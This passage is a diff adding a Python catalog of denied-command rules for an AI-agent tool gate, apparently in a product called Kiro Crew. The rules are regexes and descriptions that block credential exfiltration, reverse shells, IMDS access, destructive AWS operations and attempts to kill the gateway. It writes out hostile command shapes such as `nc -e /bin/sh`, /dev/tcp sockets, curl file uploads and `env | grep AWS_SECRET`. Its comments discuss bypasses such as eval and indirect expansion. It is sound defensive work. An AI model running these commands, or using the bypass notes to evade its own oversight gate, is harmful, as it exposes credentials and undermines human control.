@@ -1,0 +1,1522 @@
+"""The built-in denied-command catalog: the row type and every built-in row.
+
+Each row is a regex with a stable id (the opt-out key and the SEL audit key), a
+category for UI grouping and a human description. Rows are default-on,
+user-disableable and force-pinnable by a governance policy, so nothing that must
+always hold may live here alone. The AWS environment rows build their variable
+selectors from one word list declared beside them, so the grep, awk/sed and
+printenv rows agree on which variable names are secret-bearing.
+
+:mod:`kiro_crew.security.denied_rules` is the import path of every name defined
+here.
+"""
+
+from __future__ import annotations
+
+from dataclasses import dataclass
+
+# ── Built-in Denied-Command Rules ──
+# The canonical catalog of built-in denied commands.  Each rule is a Python
+# REGEX (matched case-insensitively via ``re.search``) with a stable ``id``
+# (the opt-out key + SEL audit key), a ``category`` for UI grouping, and a
+# human ``description``.  Rules are DEFAULT-ON but user-disableable from
+# Settings → Security; a governance ``commands``-scope policy can force-pin a
+# rule as un-opt-out-able (see ``platform/governance.py``).  Enforcement is at
+# Kiro Crew's own ``hooks.py`` PreToolUse gate — these are NOT injected into the
+# kiro-cli agent spec.
+#
+# The always-on keystone controls (``_is_git_publish``,
+# ``is_sensitive_bash_command``, ``audit_bash_exfiltration``,
+# ``_check_imds_access``, ``_ENV_CRED_PATTERNS``, ``_SENSITIVE_HOME_DIRS``) are
+# independent and un-disableable; they run BEFORE the rule tiers.
+
+
+@dataclass(frozen=True)
+class DeniedCommandRule:
+    """A single built-in denied-command rule.
+
+    ``pattern`` is a Python regex string matched via ``re.search`` with
+    ``re.IGNORECASE`` (NOT an fnmatch glob).  ``id`` is a stable slug used as
+    the opt-out key in config and as the SEL audit ``rule_id``.
+    """
+
+    id: str
+    pattern: str
+    category: str
+    description: str
+
+
+# Variable-name words that make an AWS variable secret-BEARING, i.e. printing it
+# prints a credential. ``ACCESS`` counts: ``AWS_ACCESS_KEY_ID`` is half of a key
+# pair and is the name an exfiltrator selects for first.
+_AWS_SECRET_WORDS: tuple[str, ...] = ("SECRET", "SESSION", "SECURITY", "ACCESS")
+_AWS_SECRET_VAR_NAMES = r"(?:" + "|".join(_AWS_SECRET_WORDS) + r")"
+
+
+def _aws_secret_word_prefix_alternation() -> str:
+    """Alternation over every PROPER prefix of an :data:`_AWS_SECRET_WORDS` entry.
+
+    ``grep`` selects by SUBSTRING, so ``env | grep AWS_S`` prints
+    ``AWS_SECRET_ACCESS_KEY``'s value exactly as ``env | grep AWS_SECRET`` does. A
+    selector that only recognised whole words would therefore treat a one-keystroke
+    truncation as benign. Matching a truncation is only sound where the operand ENDS
+    there, though -- ``AWS_SDK_LOAD_CONFIG`` also begins ``AWS_S`` and leads nowhere
+    secret -- which is why the caller pairs this alternation with a boundary
+    lookahead and keeps the whole-word alternative separate (a whole word may be
+    followed by more name characters, a truncation may not).
+
+    Longest prefix first so the engine settles on the longest match without
+    backtracking through the shorter ones.
+    """
+    prefixes = {word[:i] for word in _AWS_SECRET_WORDS for i in range(1, len(word))}
+    return "|".join(sorted(prefixes, key=lambda prefix: (-len(prefix), prefix)))
+
+
+# The name a text filter selects on, when selecting it can print a credential:
+# the bare ``AWS`` / ``AWS_`` prefix (which selects every AWS variable, secrets
+# included), a secret-bearing word, or a truncation of one that ends the operand.
+# Selecting a named non-secret variable (``AWS_REGION``, ``AWS_PROFILE``,
+# ``AWS_SDK_LOAD_CONFIG``) is allowed -- it cannot print a secret.
+#
+# The boundary classes include DIGITS: ``env | grep AWS1`` selects a variable whose
+# name contains ``AWS1``, which no secret-bearing name does, so treating a digit as
+# the end of the bare prefix would deny a command that cannot leak.
+_AWS_SECRET_WORD_PREFIXES = _aws_secret_word_prefix_alternation()
+_AWS_VAR_SELECTOR = (
+    r"AWS(?:(?![A-Za-z0-9_])"
+    r"|_(?![A-Za-z0-9])"
+    rf"|_{_AWS_SECRET_VAR_NAMES}"
+    rf"|_(?:{_AWS_SECRET_WORD_PREFIXES})(?![A-Za-z0-9_]))"
+)
+# grep reads its operand as a plain regex, so ``AWS-`` before a name character is
+# a literal, which no secret-bearing name or credential value contains
+# (``aws-account-id=``); its selector lets that shape pass, while any other hyphen
+# can take a quantifier (``AWS-?``) and still ends the prefix. Only grep gets this.
+# Where grep ignores that text instead (a PCRE comment, an optional group, a
+# bracket), the rest of the pattern is judged as main judges it with a plain word.
+# awk EVALUATES ``AWS-x`` as code on the variable ``AWS``, and sed lets ANY
+# character delimit a regex address or an ``s`` command (``\-AWS-p`` is the regex
+# ``AWS``), so a ``-`` in sed text cannot be read as a literal; both keep the
+# boundary above.
+_AWS_TEXT_VAR_SELECTOR = _AWS_VAR_SELECTOR.replace(
+    r"AWS(?:(?![A-Za-z0-9_])", r"AWS(?:(?![A-Za-z0-9_]|-[A-Za-z0-9_])", 1
+)
+
+# Spellings that DUMP the environment. ``environ`` is one because
+# ``/proc/<pid>/environ`` IS the process environment under a path, and ``typeset``
+# because with no operand it prints every variable WITH its value. Both are here
+# explicitly rather than by accident: a substring matcher caught them only because
+# ``environ`` contains ``env`` and ``typeset`` contains ``set``, so bounding the
+# verb as a word -- which is what stops ``pyenv``, ``dotenv``, ``src/environment``
+# and ``settings.py`` from counting -- would otherwise DROP two real dumps.
+# Longest spelling first so the alternation settles on ``environ`` rather than on
+# the ``env`` prefix inside it.
+_ENV_DUMP_VERBS = r"(?:environ|printenv|typeset|export\s+-p|env|set)"
+
+# An environment dump PIPED through a text filter that selects AWS variables.
+# Backs the disableable ``credential-exfil-env-grep-aws`` rule, which the always-on
+# keystone re-enforces by id (``_ENV_CRED_SHARED_RULE_IDS``) so the two tiers cannot
+# drift apart.
+#
+# The narrowing this rule carries over a plain substring match is entirely in its
+# two anchors, because those are the two an attacker cannot rewrite around:
+# * the dump verb must both BEGIN and END a word (``(?<![\w-])`` / ``(?!\w)``), so
+#   ``unset``, ``offset``, ``pyenv``, ``dotenv``, ``virtualenv``,
+#   ``src/environment`` and ``settings.py`` are not dumps. A ``.`` or ``/`` before
+#   the verb is deliberately allowed: ``/usr/bin/env``, ``/bin/printenv`` and
+#   ``/proc/self/environ`` are the same dumps under a path and are the most
+#   ordinary spelling of the command. The filter word is bounded on BOTH sides, so
+#   ``'grep'`` and ``/usr/bin/grep`` count while ``grepfoo`` and the ``sed`` in ``used``
+#   do not; the prefixed spellings (``egrep``, ``gawk``, ``gsed``) are listed for it;
+# * the selector must be a name whose selection can PRINT a credential
+#   (``_AWS_VAR_SELECTOR``) -- ``env | grep AWS_REGION`` cannot, and is allowed.
+# A ``|`` must appear between the dump and the filter, which is what keeps ``env``
+# as a wrapper (``env FOO=1 cmd``), ``set -e; grep AWS_ file.txt`` and
+# ``cat .env; grep AWS_ config.py`` out.
+#
+# The gaps are deliberately plain ``.*`` -- ordered existence across the text (the
+# matcher crosses line breaks), with no statement or pipeline-stage scoping.
+# A statement-scoped span has to treat ``;`` and ``&`` as separators, and a regex
+# cannot tell a separator from the identical character inside a quoted argument:
+# ``env | sed 's/;/x/' | grep AWS_SECRET_ACCESS_KEY`` and
+# ``env | grep -E 'a&b|AWS_SECRET'`` are ordinary credential dumps whose only
+# unusual feature is a quoted separator, and a span that stops there fails OPEN.
+# Guessing the other way costs an over-block instead: a ``set …`` earlier in the
+# text makes any later ``… | grep AWS_`` a match. That is the
+# residual, it is the safe direction, and it is the reason the gaps are not spans.
+#
+# What this rule does NOT cover, on purpose: a dump REDIRECTED to a file and read
+# back with no pipe (``env > f; grep AWS_SECRET f``). Correlating the sink with the
+# reader needs a backreference, which the RE2-style engine these built-ins are
+# authored for does not have; and blocking only the ``grep`` spelling would be no
+# control at all, since ``awk``, ``sed`` and a plain ``cat`` of the same file read
+# it just as well and are equally unmatched. The output layer's
+# ``redact_credentials`` (AKIA/ASIA plus high-entropy detection) is what stands
+# between that shape and a chat surface.
+_ENV_DUMP_GREP_AWS_PATTERN = (
+    rf"(?<![\w-]){_ENV_DUMP_VERBS}(?!\w)"
+    + r".*\|.*"
+    + r"(?<![\w-])[a-z0-9]{0,5}grep(?!\w)"
+    + r".*"
+    + _AWS_TEXT_VAR_SELECTOR
+)
+_ENV_DUMP_AWK_SED_AWS_PATTERN = (
+    rf"(?<![\w-]){_ENV_DUMP_VERBS}(?!\w)"
+    + r".*\|.*"
+    + r"(?<![\w-])(?:[gmn]?awk|g?sed|ssed)(?!\w)"
+    + r".*"
+    + _AWS_VAR_SELECTOR
+)
+
+# ``printenv NAME...`` prints the named variables' VALUES, so naming a
+# secret-bearing variable is a credential read. Naming a non-secret one
+# (``printenv AWS_REGION``) is not. Unlike ``grep``, ``printenv`` takes EXACT
+# names, so a truncation (``printenv AWS_S``) prints nothing and is not denied --
+# which is why this pattern uses the whole-word alternation and the piped form
+# (``printenv | grep ...``) is ``_ENV_DUMP_GREP_AWS_PATTERN``'s job.
+_PRINTENV_AWS_SECRET_PATTERN = r"(?<![\w-])printenv(?!\w).*AWS_" + _AWS_SECRET_VAR_NAMES
+
+# netcat with a program to execute -- ``nc -e /bin/sh host port`` -- with ``nc``
+# required to BEGIN a token. ``rsync -e ssh`` ENDS in exactly the letters
+# ``nc -e``, so an unanchored substring refuses every rsync with a detached
+# remote-shell flag (the ordinary rsync-over-ssh transfer), and every read-only
+# command that merely quotes that phrase, as a reverse shell. The left boundary
+# is two fixed-width lookbehinds. The first excludes a word character, ``.``
+# or ``-`` directly before the verb (``rsync``, ``vnc``, ``dataset.nc``, a
+# ``-nc`` flag). The second excludes the ``\w=`` assignment shape -- a word
+# character then ``=`` -- directly before the verb (``X=nc``); a ``=`` alone at
+# the start of a word is not excluded (``=nc``), and neither is ``:`` (the
+# drive-relative ``C:nc``). ``/``
+# (``/usr/bin/nc``, ``./nc``), ``\`` (an alias-bypass ``\nc``), whitespace
+# (``sudo nc``, ``env X=1 nc``, ``busybox nc``), a separator (``;`` ``&&`` ``||``
+# ``|``) or an opener (``(``, ``$(``, a backtick, a quote) leaves the command token
+# whole, so every genuine invocation the bare substring refuses is refused here
+# too. ``\s+`` rather than one space is how the always-on exfil gate spells the
+# same command (``exfil._BASH_EXFIL_RES``); the whitespace-normalized pass-2 view
+# matches the padded form either way. Nothing constrains what follows the flag:
+# getopt accepts the program glued to it (``-e/bin/sh``, ``-esh``), so the row
+# fires on ``-e`` followed by anything. ``ncat`` is the sibling row's spelling and
+# deliberately not this one's -- each row governs exactly its own spelling so an
+# operator's toggle means what it says, and ``ncat`` has an ``a`` where this row's
+# whitespace is, so the two cannot both fire on one spelling.
+_NETCAT_EXEC_PATTERN = r"(?<![\w.-])(?<!\w=)nc\s+-e"
+
+# ``AWS_CONFIG_FILE`` / ``AWS_SHARED_CREDENTIALS_FILE`` hold a PATH, not a
+# secret, so the global secret scrub leaves both in an agent child's environment (the AWS CLI
+# and SDKs read them); ``acp.client._apply_pod_home_remap`` drops both for a pod child.
+#
+# Two rules are deliberately ABSENT here, and the reasoning is worth keeping
+# because it generalizes to any future "deny the variable name" proposal: a
+# shell dereference (``$NAME``, ``${NAME}``, ``%NAME%``, ``!NAME!``,
+# ``$env:NAME``) and an inline-interpreter environment lookup
+# (``os.environ['NAME']``).
+#
+# Such a rule is only reachable at all when something EXPORTS one of these
+# names into an agent child pinned at the real home, which would make the name
+# an alias for a path the sensitive-path keystone fences; because the matchers
+# here work on command TEXT with no variable expansion, that alias would be
+# reachable while the literal path is refused.
+#
+# Closing that retrieval one spelling at a time -- the shell sigils, then the
+# interpreter lookup, then ``cp "$(printenv NAME)" x`` -- is the shape of a
+# losing race: command substitution, ``eval``, indirect expansion
+# (``v=NAME; cat "${!v}"``), and a two-line helper script are all still
+# available, and no text matcher can see through them. The alias is denied at
+# its source instead: the remap in ``acp.client._apply_pod_home_remap`` exports
+# neither name. With nothing manufacturing the alias, such rules would guard
+# only an operator who set the variable in their own environment -- their own
+# named file, not an alias this codebase created -- at the cost of implying a
+# completeness the pattern class cannot deliver. Partial coverage of an
+# unbounded bypass space is worse than none, because it reads as a fence.
+#
+# That judgement holds across this whole catalog, so this note reads as
+# precedent rather than as an exception: the twenty-seven
+# sensitive-file-read rows are absent for the identical reason, so no path --
+# named literally or through a variable -- is fenced at the text layer. The
+# floor is
+# ``redact_credentials`` on the output, ``is_sensitive_path`` on every resolved
+# path a file tool opens (which anchors ``KIROCREW_OS_HOME`` as an alternate home
+# root, so a pod's relocated credential tree is covered there), and the OS sandbox
+# on the subprocess. ``_AWS_SECRET_VAR_NAMES`` above still denies retrieval of the
+# variables that hold a SECRET rather than a path; that set is closed and
+# enumerable, which is why a name-based rule is defensible there and not here.
+
+
+BUILTIN_DENIED_RULES: list[DeniedCommandRule] = [
+    DeniedCommandRule(
+        id="credential-exfil-s3-cp",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+s3(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+cp .* s3://.*",
+        category="credential-exfil",
+        description=(
+            "Blocks `aws s3 cp` uploads to an s3:// destination, which can exfiltrate local "
+            "files or credentials into an attacker-controlled bucket."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-s3-mv",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+s3(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+mv .* s3://.*",
+        category="credential-exfil",
+        description=(
+            "Blocks `aws s3 mv` moves to an s3:// destination, which can exfiltrate local files "
+            "or credentials into an attacker-controlled bucket."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-s3-sync",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+s3(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+sync .* s3://.*",
+        category="credential-exfil",
+        description=(
+            "Blocks `aws s3 sync` to an s3:// destination, which can bulk-exfiltrate a local "
+            "directory tree into an attacker-controlled bucket."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-echo-aws-secret",
+        pattern=".*echo.*\\$AWS_SECRET.*",
+        category="credential-exfil",
+        description=(
+            "Blocks echoing the $AWS_SECRET* environment variable, which would print the AWS "
+            "secret access key to stdout/logs where it can be captured."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-echo-aws-session",
+        pattern=".*echo.*\\$AWS_SESSION.*",
+        category="credential-exfil",
+        description=(
+            "Blocks echoing the $AWS_SESSION* environment variable, which would print the AWS "
+            "session token to stdout/logs where it can be captured."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-echo-aws-access",
+        pattern=".*echo.*\\$AWS_ACCESS.*",
+        category="credential-exfil",
+        description=(
+            "Blocks echoing the $AWS_ACCESS* environment variable, which would print the AWS "
+            "access key ID to stdout/logs where it can be captured."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-printenv-aws",
+        pattern=_PRINTENV_AWS_SECRET_PATTERN,
+        category="credential-exfil",
+        description=(
+            "Blocks `printenv` naming a secret-bearing AWS variable (`AWS_SECRET*`, "
+            "`AWS_SESSION*`, `AWS_SECURITY*`, `AWS_ACCESS*`), which prints the credential "
+            "held in the environment. Naming a non-secret variable such as `AWS_REGION` "
+            "is allowed."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-kirocrew-token",
+        # Enforced by BOTH the regex tier and the argv-structural floor
+        # (``_is_credential_mint``) -- a union, so neither can fail open alone.
+        # This pattern is the raw-text half: it still sees inside a nested shell
+        # payload (``bash -c "… token"``) and covers the case where tokenizing
+        # fails outright.  The name must be in COMMAND POSITION -- start of input or
+        # after a separator, optionally quoted or path-qualified -- so the word
+        # merely APPEARING in another command's arguments (``echo kirocrew token``,
+        # ``git commit -m '… token …'``) is not a mint.  The gap then accepts
+        # anything up to a command separator (``; & |``), a comment (``#``), a
+        # redirect (``>``), a path separator (``/``) or a glob (``*``); the last two
+        # keep an ordinary product-named path, and a regex LITERAL quoting this very
+        # rule, from reading as a mint.  ``\btoken\b`` keeps ``tokens`` and
+        # ``token_auth.py`` from matching at all.  The forms this half misses on
+        # purpose (a redirect between name and verb, a quoted verb) are the floor's.
+        pattern=(
+            "(?:\\A|[;&|\\n`]|\\$\\()[\\s\"'(]*"
+            "[\\w.:/\\\\-]*kiro[-.]?crew\\b[^|;&#>/*]*\\btoken\\b"
+        ),
+        category="credential-exfil",
+        description=(
+            "Blocks the `kirocrew token` CLI, which mints a signed dashboard access token an "
+            "attacker could use to authenticate to the gateway. Matches the CLI name and the "
+            "token verb within one command segment -- including nested forms such as `kirocrew "
+            "pod token` and the hyphenated `kiro-crew` spelling -- so an incidental mention of "
+            "the word in a later command, a comment, or a file path is not a mint. The argv "
+            "floor additionally covers `python -m kiro_crew ... token`, which mints the same "
+            "token through the interpreter rather than the console script."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-kirocrew-token-argv",
+        # Companion to the rule above, for the case a command-text matcher cannot
+        # otherwise reach: an INTERPRETER payload that spawns the CLI through a
+        # library call rather than as a shell word --
+        # ``python -c "subprocess.run(['kirocrew','token'])"``,
+        # ``node -e 'execFileSync("kirocrew",["token"])'``,
+        # ``perl -e 'system("kirocrew","token")'``.  The floor cannot help here: the
+        # payload is one opaque token to the shell tokenizer and its contents are
+        # Python/JS, not shell.
+        #
+        # Scoped to the two words as ADJACENT QUOTED ARGUMENTS, which is what every
+        # such argv literal looks like.  The separator class admits only the
+        # punctuation that appears BETWEEN argv elements (quote, comma, whitespace,
+        # an opening bracket or paren) PLUS the characters an intervening quoted FLAG
+        # is made of, since an argv literal may carry global options between the
+        # program and the verb -- deliberately NOT ``.``, ``*``, ``/`` or
+        # ``>``.  That is what keeps a regex LITERAL quoting this very rule
+        # (``re.search(r'.*kirocrew.*token', cmd)``) and prose mentioning both words
+        # from matching, both of which are recorded false positives.
+        #
+        # Accepted over-block from that widening: a quoted LIST that merely contains
+        # both words as data (``print(['kirocrew', 'x', 'token'])``) also matches.
+        # That direction is the safe one -- a visible refusal, not a silent bypass.
+        # Residual limit, stated rather than implied: an interpreter that ASSEMBLES the
+        # name at runtime (string concatenation, a base64 blob, an HTTP call to the
+        # gateway) never contains it for any pattern to find.  The un-disableable
+        # guarantee for this credential remains the sensitive-path floor over the
+        # signing key, not this rule.
+        pattern=(
+            "(?:"
+            # (a) argv literal: the two words as adjacent QUOTED arguments.
+            "['\"][\\w.:/\\\\-]*kiro[-.]?crew[\\w.]*['\"][\\s,\\[\\]\\(\\)+*'\"=\\w-]*['\"]token['\"]"
+            # (b) SINK-QUALIFIED single string: the two words inside ONE quoted
+            # string, but only as the argument of a call that EXECUTES it.  The
+            # sink prefix is what makes this safe -- it is precisely what a regex
+            # literal (``re.search(...)``), a commit message and prose lack, so
+            # they stay allowed while ``os.system(\"... token\")`` does not.
+            "|"
+            "(?:os\\.system|os\\.popen|os\\.exec\\w*|(?:asyncio\\.)?create_subprocess_\\w*"
+            "|(?:\\w+\\.)?(?:run|call|check_call|check_output|popen|Popen|getoutput|getstatusoutput)"
+            "|commands\\.getoutput|popen\\d?|system|shell_exec|passthru|proc_open"
+            "|child_process\\.exec\\w*|exec\\w*sync|spawn\\w*"
+            "|kernel\\.system|io\\.popen)"
+            "\\s*\\(?\\s*[a-z]{0,2}['\"][^'\"]*\\b(?:kiro[-.]?crew|irocrew)\\b"
+            "[^'\"]*\\btoken\\b"
+            ")"
+        ),
+        category="credential-exfil",
+        description=(
+            "Blocks an interpreter payload that spawns the `kirocrew token` credential mint "
+            "through a library call rather than as a shell command -- the CLI name and the "
+            "token verb as adjacent QUOTED arguments, as in "
+            "`python -c \"subprocess.run(['kirocrew','token'])\"`, or both words in one quoted "
+            'string handed to a call that executes it (an `os.system` call given "kirocrew '
+            'token"). A quoted string with no executing call (a regex literal, prose) is not '
+            "matched; a name assembled at runtime is out of reach of command-text matching and "
+            "is covered by the sensitive-path floor over the signing key instead."
+        ),
+    ),
+    DeniedCommandRule(
+        id="self-protection-kill-interpreter",
+        # Companion to ``self-protection-kill`` for the shape a shell-command matcher
+        # cannot reach: an INTERPRETER payload that terminates the gateway through a
+        # library call -- ``os.system("pkill -f kirocrew")``,
+        # ``execSync("pkill -f kirocrew")``.  The argv floor cannot help; the payload is
+        # one opaque token to the shell tokenizer and its contents are Python/JS.
+        #
+        # SINK-QUALIFIED on purpose: the two words are matched inside ONE quoted string
+        # only when that string is the argument of a call that EXECUTES it.  The sink
+        # prefix is what keeps this from being a bare co-occurrence match -- prose, a
+        # commit message and a regex literal have no sink, so they stay allowed.
+        pattern=(
+            "(?:"
+            # --- sink-qualified: a shell command handed to a call that EXECUTES it ---
+            "(?:os\\.system|os\\.popen|os\\.exec\\w*|(?:asyncio\\.)?create_subprocess_\\w*"
+            "|(?:\\w+\\.)?(?:run|call|check_call|check_output|popen|Popen|getoutput|getstatusoutput)"
+            "|commands\\.getoutput|popen\\d?|system|shell_exec|passthru|proc_open"
+            "|child_process\\.exec\\w*|exec\\w*sync|spawn\\w*"
+            "|kernel\\.system|io\\.popen)"
+            "(?:"
+            # (a) the command as a single quoted string.
+            "\\s*\\(?\\s*[a-z]{0,2}['\"][^'\"]*\\b(?:pkill|killall)\\b"
+            "[^'\"]*\\b(?:kiro[-.]?crew|irocrew)\\b"
+            # (b) the command as an argv LIST -- verb and target as separate quoted
+            # elements (``run(['pkill','-f','kirocrew'])``), list concatenation included.
+            "|[\\s\\(\\[]*['\"][\\w.:/\\\\-]*(?:pkill|killall)['\"]"
+            "[\\s,\\[\\]\\(\\)+*'\"=\\w-]*['\"][^'\"]*(?:kiro[-.]?crew|irocrew)"
+            ")"
+            # --- a DIRECT process-kill API, which IS the sink and therefore stands on
+            # its own rather than behind the list above: ``os.kill(pid_from("[k]irocrew
+            # gateway"), 9)``.  The signal is the kill API and the product name in the
+            # same call.  Matched on ``irocrew`` rather than the full name so the
+            # standard "don't match my own lookup" bracket idiom (``[k]irocrew``), which
+            # still resolves to the gateway, is not a free pass.
+            "|(?:os\\.kill(?:pg)?|process\\.kill|\\bkillpg)\\s*\\([^)]*irocrew"
+            ")"
+        ),
+        category="self-protection",
+        description=(
+            "Blocks an interpreter payload that terminates a kirocrew process through a "
+            "library call rather than as a shell command -- a pkill/killall command and the "
+            "product name inside one quoted string passed to an executing sink such as "
+            "``os.system(...)`` or ``execSync(...)``. Sink-qualified so prose, a commit message "
+            "or a regex literal naming both is not a kill."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-env-grep-aws",
+        pattern=_ENV_DUMP_GREP_AWS_PATTERN,
+        category="credential-exfil",
+        description=(
+            "Blocks piping an environment dump (`env`, `printenv`, `set`, `export -p`, "
+            "`typeset`, `/proc/<pid>/environ`) through grep for the bare "
+            "`AWS`/`AWS_` prefix, a secret-bearing AWS variable, or a truncation of one "
+            "such as `AWS_S`, which leaks any credentials stored there. Selecting a named "
+            "non-secret variable such as `AWS_REGION` or `AWS_SDK_LOAD_CONFIG` is allowed."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-env-awk-sed-aws",
+        pattern=_ENV_DUMP_AWK_SED_AWS_PATTERN,
+        category="credential-exfil",
+        description=(
+            "Blocks piping an environment dump through awk (including gawk/mawk/nawk) "
+            "or sed with the bare `AWS`/`AWS_` prefix, a secret-bearing AWS variable, or "
+            "a truncation such as `AWS_S`. Awk evaluates code and sed lets any character "
+            "delimit an address (`\\-AWS-p`), so `AWS-x` keeps the bare `AWS` boundary "
+            "rather than counting as a harmless hyphenated text selector."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-python-boto3-get-credentials",
+        pattern=".*python.*boto3.*get_credentials.*",
+        category="credential-exfil",
+        description=(
+            "Blocks a Python/boto3 one-liner calling get_credentials(), which resolves and can "
+            "print the active AWS credentials from the credential chain."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-python-botocore-credentials",
+        pattern=".*python.*botocore.*credentials.*",
+        category="credential-exfil",
+        description=(
+            "Blocks a Python/botocore one-liner accessing the credentials module, which can "
+            "resolve and expose the active AWS credentials."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-curl-imds",
+        pattern=".*curl.*169\\.254\\.169\\.254.*",
+        category="credential-exfil",
+        description=(
+            "Blocks `curl` to the 169.254.169.254 instance metadata service (IMDS), a classic "
+            "path to steal EC2 role credentials."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-wget-imds",
+        pattern=".*wget.*169\\.254\\.169\\.254.*",
+        category="credential-exfil",
+        description=(
+            "Blocks `wget` to the 169.254.169.254 instance metadata service (IMDS), a classic "
+            "path to steal EC2 role credentials."
+        ),
+    ),
+    # ── Floor-PRIMARY exfil rules ──
+    # Enforcement for these seven is the always-on gate
+    # (``audit_bash_exfiltration`` / ``_check_imds_access``), not the regex tier:
+    # the gate sees flag spellings and IP encodings no single human-auditable
+    # regex can cover. Each ``pattern`` below is a readable SUBSET that exists so
+    # the rule has a catalog identity — an id to switch off, a row in Settings, and
+    # a ``rule_id`` in the SEL trail. Same shape as
+    # ``credential-exfil-kirocrew-token``.
+    DeniedCommandRule(
+        id="credential-exfil-imds-any",
+        pattern=".*169\\.254\\.169\\.254.*",
+        category="credential-exfil",
+        description=(
+            "Blocks reaching the instance metadata service by ANY verb and ANY IP encoding "
+            "(decimal, hex, octal, IPv6-mapped, and the fd00:ec2::254 endpoint) — the "
+            "curl/wget rules above only cover those two verbs and the literal dotted quad."
+        ),
+    ),
+    DeniedCommandRule(
+        id="data-exfil-curl-file-body",
+        pattern=".*curl.*--?data(-binary|-ascii|-urlencode)?[= ]@.*",
+        category="credential-exfil",
+        description=(
+            "Blocks a `curl` request whose body is read from a LOCAL FILE (`-d @file` and every "
+            "--data variant), the tell-tale shape of pushing local data out to a remote."
+        ),
+    ),
+    DeniedCommandRule(
+        id="data-exfil-curl-multipart-upload",
+        pattern=".*curl.*(-F|--form)\\s*\\S*=@.*",
+        category="credential-exfil",
+        description=(
+            "Blocks a `curl` multipart upload that attaches a local file (`-F field=@file`), "
+            "for any field name."
+        ),
+    ),
+    DeniedCommandRule(
+        id="data-exfil-curl-upload",
+        pattern=".*curl.*(--upload-file|(^|\\s)-T\\s*\\S).*",
+        category="credential-exfil",
+        description=(
+            "Blocks a `curl` file upload (`--upload-file` / `-T file`), which sends a local file "
+            "to a remote endpoint."
+        ),
+    ),
+    DeniedCommandRule(
+        id="data-exfil-wget-post-file",
+        pattern=".*wget.*--post-file.*",
+        category="credential-exfil",
+        description=(
+            "Blocks `wget --post-file`, which posts the contents of a local file to a remote "
+            "endpoint."
+        ),
+    ),
+    DeniedCommandRule(
+        id="data-exfil-nc-file-redirect",
+        pattern=".*(^|\\s)nc(at)?\\s+\\S.*<.*",
+        category="credential-exfil",
+        description=(
+            "Blocks piping a local file into `nc`/`ncat` via input redirection, a plain-socket "
+            "way to ship data off the host."
+        ),
+    ),
+    DeniedCommandRule(
+        id="reverse-shell-devtcp",
+        pattern=".*/dev/(tcp|udp)/.*",
+        category="reverse-shell",
+        description=(
+            "Blocks bash's /dev/tcp and /dev/udp pseudo-devices, which open a raw socket to a "
+            "remote host without any external tool — the classic dependency-free reverse shell."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-curl-aws-secret",
+        pattern=".*curl.*\\$AWS_SECRET.*",
+        category="credential-exfil",
+        description=(
+            "Blocks `curl` invocations that reference $AWS_SECRET*, which would send the AWS "
+            "secret access key to a remote endpoint."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-curl-aws-access",
+        pattern=".*curl.*\\$AWS_ACCESS.*",
+        category="credential-exfil",
+        description=(
+            "Blocks `curl` invocations that reference $AWS_ACCESS*, which would send the AWS "
+            "access key ID to a remote endpoint."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-curl-aws-session",
+        pattern=".*curl.*\\$AWS_SESSION.*",
+        category="credential-exfil",
+        description=(
+            "Blocks `curl` invocations that reference $AWS_SESSION*, which would send the AWS "
+            "session token to a remote endpoint."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-autoscaling-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+autoscaling(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws autoscaling delete-*' command, which tears down Auto Scaling "
+            "groups, policies, or launch configurations and can permanently disrupt capacity "
+            "management."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-cfn-delete-stack",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+cloudformation(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-stack.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws cloudformation delete-stack', which destroys an entire CloudFormation "
+            "stack and every resource it manages."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-cfn-deploy-mutate",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+cloudformation(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+(deploy|create-stack|update-stack|create-change-set|execute-change-set).*",
+        category="aws-destructive",
+        description=(
+            "Blocks CloudFormation "
+            "deploy/create-stack/update-stack/create-change-set/execute-change-set, which "
+            "create or mutate infrastructure stacks and can overwrite live production "
+            "resources."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-ec2-run-instances",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+ec2(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+run-instances.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws ec2 run-instances', which launches new EC2 instances that incur cost "
+            "and can be abused for resource sprawl or cryptomining."
+        ),
+    ),
+    DeniedCommandRule(
